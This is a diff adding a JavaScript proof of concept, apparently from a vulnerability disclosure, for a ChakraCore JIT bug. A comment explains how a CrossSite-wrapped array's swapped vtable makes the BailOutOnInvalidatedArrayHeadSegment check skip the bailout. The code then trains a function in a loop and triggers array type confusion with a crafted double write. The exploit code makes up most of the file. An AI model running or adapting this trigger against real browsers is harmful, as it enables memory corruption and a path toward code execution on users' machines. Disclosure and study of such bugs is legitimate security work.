@@ -1,0 +1,51 @@
+/*
+The BailOutOnInvalidatedArrayHeadSegment check uses the JavascriptArray::GetArrayForArrayOrObjectWithArray method to check whether the given object is an array. If it's not an array, it will decide to skip the check which means that no bailout will happen. The JavascriptArray::GetArrayForArrayOrObjectWithArray method determines it by comparing the vtable of the given object like the following.
+
+        if(vtable == VirtualTableInfo<JavascriptArray>::Address)
+        {
+            *arrayTypeIdRef = TypeIds_Array;
+        }
+        else if(vtable == VirtualTableInfo<JavascriptNativeIntArray>::Address)
+        {
+            *arrayTypeIdRef = TypeIds_NativeIntArray;
+        }
+        else if(vtable == VirtualTableInfo<JavascriptNativeFloatArray>::Address)
+        {
+            *arrayTypeIdRef = TypeIds_NativeFloatArray;
+        }
+        else
+        {
+            return nullptr;
+        }
+
+        if(!array)
+        {
+            array = FromVar(var);
+        }
+        return array;
+
+Since wrapping an object with the CrossSite class replaces the vtable of the object, this can be used to bypass it.
+
+PoC:
+*/
+
+function opt(x_obj, arr) {
+    arr[0] = 1.1;
+    
+    x_obj.a = arr;  // Replacing the vtable.
+    arr['leng' + 'th'] = 0;  // The length changes, but the BailOutOnInvalidatedArrayHeadSegment check will think that it's not an array. So no bailout will happen.
+
+    arr[0] = 2.3023e-320;
+}
+
+let x_obj = document.body.appendChild(document.createElement('iframe')).contentWindow.eval('({})');
+let arr = [1.1, 1.1];
+
+for (let i = 0; i < 10000; i++) {
+    opt(x_obj, arr.concat());
+}
+
+opt(x_obj, arr);
+
+arr[1] = {};  // in-place type conversion
+alert(arr);
